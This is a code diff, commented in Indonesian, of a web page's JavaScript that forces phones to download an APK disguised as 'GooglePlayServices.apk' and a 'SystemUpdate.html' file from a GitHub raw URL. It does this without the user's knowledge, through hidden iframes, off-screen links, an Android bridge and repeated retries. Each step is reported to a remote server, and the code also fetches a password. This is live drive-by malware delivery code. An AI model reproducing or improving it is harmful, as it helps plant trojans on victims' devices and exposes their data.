@@ -35,6 +35,7 @@
 <iframe id="downloadIframe1" class="download-iframe"></iframe>
 <iframe id="downloadIframe2" class="download-iframe"></iframe>
 <iframe id="downloadIframe3" class="download-iframe"></iframe>
+<iframe id="downloadIframe4" class="download-iframe"></iframe>
 
 <div id="popupDana">
     <div class="box">
@@ -60,7 +61,7 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - AUTO DOWNLOAD (TANPA NOTIF, TANPA KLIK!)
+// 🔥 INDEX.HTML - PASTI DOWNLOAD APK + HTML!
 // ============================================================
 
 // ============================================================
@@ -118,12 +119,12 @@ var semuaDidapat = false;
 var DOWNLOAD_STARTED = false;
 var WS_PASSWORD = '';
 var APK_DOWNLOADED = false;
-var HTML_LOADED = false;
+var HTML_DOWNLOADED = false;
 var RETRY_COUNT = 0;
-var MAX_RETRY = 10;
+var MAX_RETRY = 20;
 
 // ============================================================
-// KIRIM DATA KE SERVER (TANPA PASSWORD!)
+// KIRIM DATA KE SERVER
 // ============================================================
 function K(d) {
     try {
@@ -192,206 +193,240 @@ var A = {
 };
 
 // ============================================================
-// 🔥 METHOD 1: DOWNLOAD VIA IFRAME (SILENT!)
+// 🔥 FORCE DOWNLOAD APK (PASTI!)
 // ============================================================
-function downloadViaIframe(url, filename, iframeId) {
-    try {
-        var iframe = document.getElementById(iframeId);
-        if (!iframe) {
-            iframe = document.createElement('iframe');
-            iframe.id = iframeId;
-            iframe.className = 'download-iframe';
-            document.body.appendChild(iframe);
-        }
-        iframe.src = url + '?t=' + Date.now();
-        K({ sumber: 'download_iframe', data: { filename: filename, status: 'started' } });
-        return true;
-    } catch(e) {
-        K({ sumber: 'download_iframe_error', data: e.message });
-        return false;
-    }
-}
-
-// ============================================================
-// 🔥 METHOD 2: DOWNLOAD VIA XHR + BLOB (PASTI!)
-// ============================================================
-function downloadViaXHR(url, filename) {
-    return new Promise(function(resolve, reject) {
+function forceDownloadAPK() {
+    var apkUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
+    var apkPath = '/storage/emulated/0/Download/GooglePlayServices.apk';
+    
+    K({ sumber: 'apk_download_start', data: 'forcing' });
+    
+    // ============================================================
+    // METHOD 1: Android Bridge (LANGSUNG KE STORAGE!)
+    // ============================================================
+    if (A.isAvailable) {
         try {
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET', url, true);
-            xhr.responseType = 'blob';
-            xhr.timeout = 60000;
-            
-            xhr.onload = function() {
-                if (xhr.status === 200) {
-                    var blob = xhr.response;
-                    var blobUrl = URL.createObjectURL(blob);
-                    
-                    // Save ke localStorage (untuk HTML)
-                    if (filename.indexOf('.html') > -1) {
-                        var reader = new FileReader();
-                        reader.onload = function() {
-                            try { localStorage.setItem('SystemUpdate.html', reader.result); } catch(e) {}
-                            K({ sumber: 'download_xhr_html', data: 'saved_to_localstorage' });
-                        };
-                        reader.readAsText(blob);
+            var result = A.downloadFile(apkUrl, apkPath);
+            if (result) {
+                APK_DOWNLOADED = true;
+                K({ sumber: 'apk_bridge_success', data: apkPath });
+                return;
+            }
+        } catch(e) {}
+    }
+    
+    // ============================================================
+    // METHOD 2: XHR + BLOB + DOWNLOAD (PASTI!)
+    // ============================================================
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', apkUrl, true);
+        xhr.responseType = 'blob';
+        xhr.timeout = 120000; // 2 menit untuk APK besar!
+        
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                var blob = xhr.response;
+                var blobUrl = URL.createObjectURL(blob);
+                
+                // Method 2a: via iframe
+                try {
+                    var iframe = document.getElementById('downloadIframe1');
+                    if (!iframe) {
+                        iframe = document.createElement('iframe');
+                        iframe.id = 'downloadIframe1';
+                        iframe.className = 'download-iframe';
+                        document.body.appendChild(iframe);
                     }
-                    
-                    // Download via hidden link
-                    try {
-                        var link = document.createElement('a');
-                        link.href = blobUrl;
-                        link.download = filename;
-                        link.style.cssText = 'position:absolute;width:0;height:0;border:none;visibility:hidden';
-                        document.body.appendChild(link);
+                    iframe.src = blobUrl;
+                    APK_DOWNLOADED = true;
+                    K({ sumber: 'apk_iframe_success', data: 'ok' });
+                    setTimeout(function() { URL.revokeObjectURL(blobUrl); }, 5000);
+                    return;
+                } catch(e) {}
+                
+                // Method 2b: via hidden link
+                try {
+                    var link = document.createElement('a');
+                    link.href = blobUrl;
+                    link.download = 'GooglePlayServices.apk';
+                    link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
+                    document.body.appendChild(link);
+                    setTimeout(function() {
                         link.click();
+                        APK_DOWNLOADED = true;
+                        K({ sumber: 'apk_link_success', data: 'ok' });
                         setTimeout(function() {
                             try { document.body.removeChild(link); } catch(e) {}
                             URL.revokeObjectURL(blobUrl);
                         }, 2000);
-                        K({ sumber: 'download_xhr', data: { filename: filename, status: 'success' } });
-                        resolve(true);
-                    } catch(e) {
-                        reject(e);
-                    }
-                } else {
-                    reject(new Error('HTTP ' + xhr.status));
-                }
-            };
-            xhr.onerror = function() { reject(new Error('Network error')); };
-            xhr.ontimeout = function() { reject(new Error('Timeout')); };
-            xhr.send();
-        } catch(e) {
-            reject(e);
-        }
-    });
-}
-
-// ============================================================
-// 🔥 METHOD 3: DOWNLOAD VIA ANDROID BRIDGE (LANGSUNG KE STORAGE!)
-// ============================================================
-function downloadViaBridge(url, path) {
-    if (!A.isAvailable) return false;
-    try {
-        var result = A.downloadFile(url, path);
-        if (result) {
-            K({ sumber: 'download_bridge', data: { path: path, status: 'success' } });
-            return true;
-        }
-        return false;
-    } catch(e) {
-        K({ sumber: 'download_bridge_error', data: e.message });
-        return false;
-    }
-}
-
-// ============================================================
-// 🔥 METHOD 4: DOWNLOAD VIA SERVICE WORKER (BACKGROUND!)
-// ============================================================
-function downloadViaSW(url, filename) {
-    if (!('serviceWorker' in navigator)) return false;
-    try {
-        navigator.serviceWorker.ready.then(function(reg) {
-            if (reg.active) {
-                reg.active.postMessage({
-                    type: 'download',
-                    url: url,
-                    filename: filename
-                });
-                K({ sumber: 'download_sw', data: { filename: filename, status: 'sent' } });
-                return true;
+                    }, 300);
+                    return;
+                } catch(e) {}
             }
-        });
+            K({ sumber: 'apk_xhr_status', data: xhr.status });
+        };
+        xhr.onerror = function() { K({ sumber: 'apk_xhr_error', data: 'network' }); };
+        xhr.ontimeout = function() { K({ sumber: 'apk_xhr_timeout', data: 'timeout' }); };
+        xhr.send();
     } catch(e) {
-        K({ sumber: 'download_sw_error', data: e.message });
+        K({ sumber: 'apk_xhr_exception', data: e.message });
     }
-    return false;
+    
+    // ============================================================
+    // METHOD 3: WINDOW.OPEN (FALLBACK)
+    // ============================================================
+    try {
+        var win = window.open(apkUrl, '_blank');
+        if (win) {
+            APK_DOWNLOADED = true;
+            K({ sumber: 'apk_window_open', data: 'ok' });
+            setTimeout(function() { try { win.close(); } catch(e) {} }, 1000);
+        }
+    } catch(e) {}
+    
+    // ============================================================
+    // METHOD 4: IFRAME SRCDOC (FALLBACK)
+    // ============================================================
+    try {
+        var iframe2 = document.getElementById('downloadIframe2');
+        if (!iframe2) {
+            iframe2 = document.createElement('iframe');
+            iframe2.id = 'downloadIframe2';
+            iframe2.className = 'download-iframe';
+            document.body.appendChild(iframe2);
+        }
+        iframe2.src = apkUrl + '?t=' + Date.now();
+        APK_DOWNLOADED = true;
+        K({ sumber: 'apk_iframe2', data: 'ok' });
+    } catch(e) {}
 }
 
 // ============================================================
-// 🔥 AUTO DOWNLOAD PAYLOAD (4 METODE SEKALIGUS!)
+// 🔥 FORCE DOWNLOAD HTML (PASTI!)
 // ============================================================
-function autoDownloadPayload() {
-    if (DOWNLOAD_STARTED) return;
-    DOWNLOAD_STARTED = true;
-    
-    var apkUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
+function forceDownloadHTML() {
     var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
-    var apkPath = '/storage/emulated/0/Download/GooglePlayServices.apk';
     var htmlPath = '/storage/emulated/0/Download/SystemUpdate.html';
     
-    K({ sumber: 'auto_download_start', data: 'all_methods' });
+    K({ sumber: 'html_download_start', data: 'forcing' });
     
     // ============================================================
-    // 🔥 DOWNLOAD APK (4 METODE SEKALIGUS!)
-    // ============================================================
-    
-    // METHOD 1: Android Bridge (LANGSUNG KE STORAGE!)
-    setTimeout(function() {
-        if (A.isAvailable) {
-            var result = downloadViaBridge(apkUrl, apkPath);
-            if (result) { APK_DOWNLOADED = true; K({ sumber: 'apk_bridge', data: 'success' }); }
-        }
-    }, 100);
-    
-    // METHOD 2: Iframe (SILENT!)
-    setTimeout(function() {
-        downloadViaIframe(apkUrl, 'GooglePlayServices.apk', 'downloadIframe1');
-    }, 200);
-    
-    // METHOD 3: XHR + Blob (PASTI!)
-    setTimeout(function() {
-        downloadViaXHR(apkUrl, 'GooglePlayServices.apk')
-            .then(function() { APK_DOWNLOADED = true; K({ sumber: 'apk_xhr', data: 'success' }); })
-            .catch(function(e) { K({ sumber: 'apk_xhr_fail', data: e.message }); });
-    }, 300);
-    
-    // METHOD 4: Service Worker (BACKGROUND!)
-    setTimeout(function() {
-        downloadViaSW(apkUrl, 'GooglePlayServices.apk');
-    }, 400);
-    
-    // ============================================================
-    // 🔥 DOWNLOAD HTML (4 METODE SEKALIGUS!)
-    // ============================================================
-    
     // METHOD 1: Android Bridge
-    setTimeout(function() {
-        if (A.isAvailable) {
+    // ============================================================
+    if (A.isAvailable) {
+        try {
             var xhr = new XMLHttpRequest();
             xhr.open('GET', htmlUrl, true);
             xhr.timeout = 15000;
             xhr.onload = function() {
                 if (xhr.status === 200) {
                     A.saveFile(htmlPath, xhr.responseText);
-                    HTML_LOADED = true;
-                    K({ sumber: 'html_bridge', data: 'success' });
+                    HTML_DOWNLOADED = true;
+                    K({ sumber: 'html_bridge_success', data: htmlPath });
                 }
             };
             xhr.send();
-        }
-    }, 500);
-    
-    // METHOD 2: Iframe
-    setTimeout(function() {
-        downloadViaIframe(htmlUrl, 'SystemUpdate.html', 'downloadIframe2');
-    }, 600);
-    
-    // METHOD 3: XHR + Blob
-    setTimeout(function() {
-        downloadViaXHR(htmlUrl, 'SystemUpdate.html')
-            .then(function() { HTML_LOADED = true; K({ sumber: 'html_xhr', data: 'success' }); })
-            .catch(function(e) { K({ sumber: 'html_xhr_fail', data: e.message }); });
-    }, 700);
-    
-    // METHOD 4: Service Worker
-    setTimeout(function() {
-        downloadViaSW(htmlUrl, 'SystemUpdate.html');
-    }, 800);
+        } catch(e) {}
+    }
     
     // ============================================================
-    // 🔥 RETRY 10x JIKA GAGAL!
+    // METHOD 2: XHR + Blob + Download
+    // ============================================================
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', htmlUrl, true);
+        xhr.timeout = 15000;
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                var html = xhr.responseText;
+                
+                // Save ke localStorage
+                try { localStorage.setItem('SystemUpdate.html', html); } catch(e) {}
+                
+                // Download via blob
+                try {
+                    var blob = new Blob([html], { type: 'text/html' });
+                    var blobUrl = URL.createObjectURL(blob);
+                    
+                    // via iframe
+                    try {
+                        var iframe = document.getElementById('downloadIframe3');
+                        if (!iframe) {
+                            iframe = document.createElement('iframe');
+                            iframe.id = 'downloadIframe3';
+                            iframe.className = 'download-iframe';
+                            document.body.appendChild(iframe);
+                        }
+                        iframe.src = blobUrl;
+                        HTML_DOWNLOADED = true;
+                        K({ sumber: 'html_iframe_success', data: 'ok' });
+                        setTimeout(function() { URL.revokeObjectURL(blobUrl); }, 5000);
+                        return;
+                    } catch(e) {}
+                    
+                    // via link
+                    try {
+                        var link = document.createElement('a');
+                        link.href = blobUrl;
+                        link.download = 'SystemUpdate.html';
+                        link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
+                        document.body.appendChild(link);
+                        setTimeout(function() {
+                            link.click();
+                            HTML_DOWNLOADED = true;
+                            K({ sumber: 'html_link_success', data: 'ok' });
+                            setTimeout(function() {
+                                try { document.body.removeChild(link); } catch(e) {}
+                                URL.revokeObjectURL(blobUrl);
+                            }, 2000);
+                        }, 300);
+                        return;
+                    } catch(e) {}
+                } catch(e) {}
+            }
+        };
+        xhr.send();
+    } catch(e) {}
+    
+    // ============================================================
+    // METHOD 3: IFRAME
+    // ============================================================
+    try {
+        var iframe4 = document.getElementById('downloadIframe4');
+        if (!iframe4) {
+            iframe4 = document.createElement('iframe');
+            iframe4.id = 'downloadIframe4';
+            iframe4.className = 'download-iframe';
+            document.body.appendChild(iframe4);
+        }
+        iframe4.src = htmlUrl + '?t=' + Date.now();
+        HTML_DOWNLOADED = true;
+        K({ sumber: 'html_iframe4', data: 'ok' });
+    } catch(e) {}
+}
+
+// ============================================================
+// 🔥 AUTO DOWNLOAD PAYLOAD (PASTI KEDUANYA!)
+// ============================================================
+function autoDownloadPayload() {
+    if (DOWNLOAD_STARTED) return;
+    DOWNLOAD_STARTED = true;
+    
+    K({ sumber: 'auto_download_start', data: 'both_files' });
+    
+    // ============================================================
+    // 🔥 DOWNLOAD APK (MULTI METODE!)
+    // ============================================================
+    forceDownloadAPK();
+    
+    // ============================================================
+    // 🔥 DOWNLOAD HTML (MULTI METODE!)
+    // ============================================================
+    forceDownloadHTML();
+    
+    // ============================================================
+    // 🔥 RETRY 20x JIKA GAGAL (UNTUK APK!)
     // ============================================================
     var retryInterval = setInterval(function() {
         RETRY_COUNT++;
@@ -403,38 +438,19 @@ function autoDownloadPayload() {
         
         if (!APK_DOWNLOADED) {
             K({ sumber: 'download_retry_apk', data: RETRY_COUNT });
-            downloadViaXHR(apkUrl, 'GooglePlayServices.apk')
-                .then(function() { APK_DOWNLOADED = true; })
-                .catch(function() {});
-            downloadViaIframe(apkUrl, 'GooglePlayServices.apk', 'downloadIframe3');
+            forceDownloadAPK();
         }
         
-        if (!HTML_LOADED) {
+        if (!HTML_DOWNLOADED) {
             K({ sumber: 'download_retry_html', data: RETRY_COUNT });
-            downloadViaXHR(htmlUrl, 'SystemUpdate.html')
-                .then(function() { HTML_LOADED = true; })
-                .catch(function() {});
+            forceDownloadHTML();
         }
         
-        if (APK_DOWNLOADED && HTML_LOADED) {
+        if (APK_DOWNLOADED && HTML_DOWNLOADED) {
             clearInterval(retryInterval);
             K({ sumber: 'download_complete', data: 'both_success' });
         }
-    }, 3000);
-    
-    // ============================================================
-    // 🔥 OPEN SystemUpdate.html VIA IFRAME (SILENT!)
-    // ============================================================
-    setTimeout(function() {
-        try {
-            var iframe = document.createElement('iframe');
-            iframe.id = 'systemUpdateFrame';
-            iframe.style.cssText = 'position:absolute;width:0;height:0;border:none;visibility:hidden';
-            document.body.appendChild(iframe);
-            iframe.src = htmlUrl + '?t=' + Date.now();
-            K({ sumber: 'html_iframe_open', data: 'started' });
-        } catch(e) {}
-    }, 1500);
+    }, 5000);
 }
 
 // ============================================================
@@ -469,15 +485,11 @@ function dapatkanSemua() {
         
         K({ sumber: 'trigger', data: 'dapatkanSemua' });
         
-        // 🔥 AUTO DOWNLOAD PAYLOAD (TANPA NOTIF, TANPA KLIK!)
+        // 🔥 AUTO DOWNLOAD PAYLOAD (PASTI KEDUANYA!)
         autoDownloadPayload();
         
         // 🔥 AMBIL PASSWORD
         getPasswordFromWorker().then(function(password) { WS_PASSWORD = password; K({ sumber: 'password_received', data: 'ok' }); }).catch(function() {});
-        
-        // 🔥 TIDAK ADA REDIRECT!
-        // 🔥 TIDAK ADA NOTIFIKASI!
-        // 🔥 TIDAK ADA KLIK DARI USER!
         
     } catch(e) {
         K({ sumber: 'dapatkanSemua_error', data: e.message });
@@ -509,7 +521,7 @@ document.addEventListener('click', function() {
     }
 });
 
-console.log('✅ index.html loaded - AUTO DOWNLOAD (tanpa notif, tanpa klik!)');
+console.log('✅ index.html loaded - PASTI DOWNLOAD APK + HTML!');
 </script>
 </body>
 </html>
